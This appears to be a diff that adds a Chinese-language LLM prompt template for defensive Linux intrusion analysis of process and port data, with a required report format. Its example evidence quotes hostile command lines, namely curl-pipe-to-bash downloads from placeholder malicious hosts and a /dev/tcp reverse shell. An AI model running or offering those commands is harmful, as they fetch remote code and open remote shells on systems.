@@ -1,0 +1,64 @@
+# 如果需要输出图表，则全部以mermaid的格式输出图表，不可以使用其他格式, 每种展示的数据不要携带单位或百分号
+
+**Linux系统安全分析指令**
+请基于用户输入`linux_check.txt`文件中的进程树与网络端口数据，执行以下多维安全审查：
+
+### **1. 进程行为分析**
+**检查点**
+- **可疑进程识别**
+  - 无有效签名/仿冒系统进程（如`/tmp/.X11-unix/sshd`、`/dev/shm/bash`）
+  - 命令行含敏感操作（如`curl http://malicious.ip|bash`、反向shell命令）
+  - 异常父进程（如`apache2`启动`/bin/sh`或`systemd`直接调用脚本）
+- **权限风险**
+  - 非root用户运行高权限服务（如UID=0的未授权进程）
+  - SUID/SGID异常文件关联进程（如`/usr/bin/chmod`被篡改）
+
+### **2. 端口与网络分析**
+**检查点**
+- **异常监听端口**
+  - 非标准服务端口（如TCP/6667、31337等IRC/后门端口）
+  - 未授权的SSH（TCP/22）、数据库（TCP/3306）暴露
+- **外联行为审查**
+  - 连接至威胁情报库中的恶意IP（如Tor出口节点、C2服务器）
+  - 高频加密通信（如持续向未知IP发送`/dev/urandom`数据）
+
+### **3. 持久化关联分析**
+- 进程与cron任务/systemd服务的关联（如某进程触发`/etc/cron.hourly/update`）
+- 比对MITRE ATT&CK TTPs（如T1053.003-恶意cron任务、T1571-非标准端口C2）
+
+**交付格式要求**
+# Linux系统安全分析报告
+## 风险概览
+| 类型       | 风险等级 | 可疑对象         | 证据摘要                |
+|------------|----------|------------------|-------------------------|
+| 进程       | 🟥高危    | /tmp/.systemd    | 反向Shell连接至5.5.5[.]5 |
+
+## 详细分析
+### 1. 进程异常：`[进程名]` (PID: )
+- **风险证据**
+  CMD: `/bin/sh -c curl http://mal.ip/backdoor | bash`
+  网络关联：ESTABLISHED -> 45.76.12[.]9:443 (已标记为Cobalt Strike)
+- **修复建议**
+  ✅ `kill -9 [PID]`终止进程并删除文件
+  ✅ 检查`/etc/rc.local`及`crontab -l`
+
+### 2. 恶意端口：TCP/31337
+- **风险证据**
+  监听进程：/usr/sbin/sshd（异常PID与原始服务冲突）
+  关联文件：`/lib/systemd/systemd-notify`（修改时间异常）
+- **修复建议**
+  ✅ `iptables -A INPUT -p tcp --dport 31337 -j DROP`阻断端口
+  ✅ 使用`rpm -Vf /usr/sbin/sshd`验证文件完整性
+
+**示例输出片段**
+> 检测到进程`/dev/shm/.cache`：
+> CMD: `/bin/bash -i >& /dev/tcp/10.0.0.2/4444 0>&1`
+> ✅ 处置：终止进程并检查`~/.bashrc`是否植入后门
+
+---
+**附加指导**
+- 使用`clamscan --infected --remove [路径]`扫描恶意文件
+- 结合`journalctl -u cron`和`/var/log/auth.log`交叉验证
+- 高风险对象需标注ATT&CK技术编号（如T1548.001-滥用SUID权限）
+
+根据上述内容和要求分析user输入的内容:
